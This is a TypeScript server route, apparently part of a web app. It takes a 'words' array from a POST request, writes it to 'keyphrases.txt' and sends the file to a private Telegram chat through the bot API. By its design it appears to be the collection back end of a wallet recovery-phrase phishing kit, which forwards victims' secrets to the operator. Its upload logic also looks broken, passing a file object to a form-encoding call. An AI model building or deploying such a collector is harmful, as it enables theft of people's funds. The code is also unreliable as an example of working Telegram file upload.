import { Buffer } from 'buffer';

const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramUserId = process.env.TELEGRAM_USER_ID;

if (!telegramBotToken || !telegramUserId) {
    throw new Error('TELEGRAM_BOT_TOKEN or TELEGRAM_USER_ID not set in .env');
}

const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;

export default defineEventHandler(async (event) => {
    try {
        const { words } = await readBody(event);

        if (!words || !Array.isArray(words) || words.length === 0) {
            return createError({
                statusCode: 400,
                message: 'No words provided. Please send a "words" array in the POST body (e.g., {"words": ["word1", "word2"]}).',
            });
        }

        const fileContent = words.join('\n');
        const buffer = Buffer.from(fileContent, 'utf-8');

        const formData = new URLSearchParams();
        formData.append('chat_id', telegramUserId);
        formData.append('caption', `Key phrases sent on ${new Date().toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' })}`);
        formData.append('document', buffer.toString('base64'), { filename: 'keyphrases.txt', contentType: 'text/plain' });

        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData.toString(),
        }).then(res => {
            if (!res.ok) {
                throw new Error('Telegram API error: ' + res.statusText);
            }
            return res.json();
        }).then(result => {
            if (result.ok) {
                return result;
            } else {
                throw new Error(result.description || 'Telegram API error');
            }
        }).catch(error => {
            throw new Error(`Failed to parse Telegram response: ${error.message}`);
        });
        return {
            statusCode: 200,
            message: 'Key phrases sent successfully via Telegram.',
        };
    } catch (error) {
        console.error('Error sending words:', error);
        throw createError({
            statusCode: 500,
            message: `Failed to send words: ${(error as Error).message}`,
        });
    }
});